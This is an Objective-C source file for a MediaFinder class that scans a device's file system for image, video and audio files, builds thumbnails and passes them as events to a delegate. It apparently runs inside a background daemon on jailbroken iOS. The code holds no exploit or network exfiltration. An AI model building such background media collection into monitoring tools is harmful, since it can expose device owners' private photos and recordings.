//
//  MediaFinder.m
//  MediaFinder
//
//  Created by Makara Khloth on 2/8/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import "MediaFinder.h"
#import "FileSystemSearcher.h"
#import "FileSystemEntry.h"
#import "MediaFoundThumbnailHelper.h"
#import "MediaFinderHistory.h"
#import "MediaHistoryDAO.h"

#import "EventDelegate.h"
#import "DaemonPrivateHome.h"

static NSString *const kPrivateVarStashDirectory		= @"/private/var/stash/";
static NSString *const kVarStashDirectory				= @"/var/stash/";

@interface MediaFinder (private)
- (NSArray *) excludedDirectories;
@end

@implementation MediaFinder

@synthesize mPath;

@synthesize mSearchDelegate;

- (id) initWithEventDelegate: (id <EventDelegate>) aDelegate andMediaPath: (NSString *) aPath {
	if ((self = [super init])) {
		mDelegate = aDelegate;
		[self setMPath:aPath];
		mFileSystemSearcher = [[FileSystemSearcher alloc] initWithFileSystemSearcherDelegate:self];
		[mFileSystemSearcher setMExceptionalPaths:[self excludedDirectories]];
		mHelpers = [[NSMutableArray array] retain];
		mMediaHistory = [[MediaFinderHistory alloc] init];
	}
	return (self);
}

- (void) findMediaFileWithExtMime: (NSArray *) aFindEntries {
	[mFileSystemSearcher start:aFindEntries];
}

- (void) thumbnailCreationCompleted: (MediaFoundThumbnailHelper *) aHelper {
	if ([mSearchDelegate respondsToSelector:@selector(fileSystemSearchFinished:)]) {
		[mSearchDelegate performSelector:@selector(fileSystemSearchFinished:) withObject:nil];
	}
	[mHelpers removeObject:aHelper];
	DLog(@"thumbnailCreationCompleted....")
}

+ (void) clearMediaHistory {
	MediaFinderHistory *history = [[MediaFinderHistory alloc] init];
	MediaHistoryDAO *dao = [[MediaHistoryDAO alloc] initWithMediaHistory:history];
	[dao clearMediaHistory];
	[dao release];
	[history release];
}

- (void) fileSystemSearchFinished: (NSArray *) aFileSystemEntries {
	DLog(@"aFileSystemEntries count = %d", [aFileSystemEntries count])
	if ([aFileSystemEntries count]) {		
		MediaFoundThumbnailHelper *helper = [[MediaFoundThumbnailHelper alloc] initWithEventDelegate:mDelegate andThumbnailPath:[self mPath]];
		[helper setMMediaFinder:self];
		[helper setMMediaHistory:mMediaHistory];
		[helper createThumbnail:aFileSystemEntries];
		[mHelpers addObject:helper];
		[helper release];		
	} else {		
		if ([mSearchDelegate respondsToSelector:@selector(fileSystemSearchFinished:)]) {
			[mSearchDelegate performSelector:@selector(fileSystemSearchFinished:) withObject:nil];
		}
		DLog(@"thumbnailCreationCompleted.... (no entries to create thumbnails)")
	}

}

- (NSArray *) excludedDirectories {
	NSMutableArray *directories = [NSMutableArray array];
	[directories addObject:[DaemonPrivateHome daemonPrivateHome]];
	[directories addObject:kPrivateVarStashDirectory];
	[directories addObject:kVarStashDirectory];
	return (directories);
}

+ (void) setImageFindEntry: (NSMutableArray *) aFindEntries {
	FindEntry *entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"jpg"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"jpeg"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"png"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"gif"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"bmp"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"tiff"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"tif"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"ico"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"cur"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"xbm"];
	[entry setMMediaType:kFinderMediaTypeImage];
	[aFindEntries addObject:entry];
	[entry release];
}

+ (void) setVideoFindEntry: (NSMutableArray *) aFindEntries {
	FindEntry *entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"mov"];
	[entry setMMediaType:kFinderMediaTypeVideo];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"m4v"];
	[entry setMMediaType:kFinderMediaTypeVideo];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"mp4"];
	[entry setMMediaType:kFinderMediaTypeVideo];
	[aFindEntries addObject:entry];
	[entry release];
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"3gp"];
	[entry setMMediaType:kFinderMediaTypeVideo];
	[aFindEntries addObject:entry];
	[entry release];
}

+ (void) setAudioFindEntry: (NSMutableArray *) aFindEntries {
	FindEntry *entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"m4a"];
	[entry setMMediaType:kFinderMediaTypeAudio];
	[aFindEntries addObject:entry];
	[entry release];
	entry = nil;
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"wav"];
	[entry setMMediaType:kFinderMediaTypeAudio];
	[aFindEntries addObject:entry];
	[entry release];
	entry = nil;
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"mp3"];
	[entry setMMediaType:kFinderMediaTypeAudio];
	[aFindEntries addObject:entry];
	[entry release];
	entry = nil;
	
	entry = [[FindEntry alloc] init];
	[entry setMExtMime:@"m4r"];
	[entry setMMediaType:kFinderMediaTypeAudio];
	[aFindEntries addObject:entry];
	[entry release];
	entry = nil;
}

- (void) dealloc {
	[mHelpers release];
	mHelpers = nil;
	[mMediaHistory release];
	[mFileSystemSearcher release];
	mFileSystemSearcher = nil;
	[mPath release];
	mPath = nil;
	[super dealloc];
}

@end
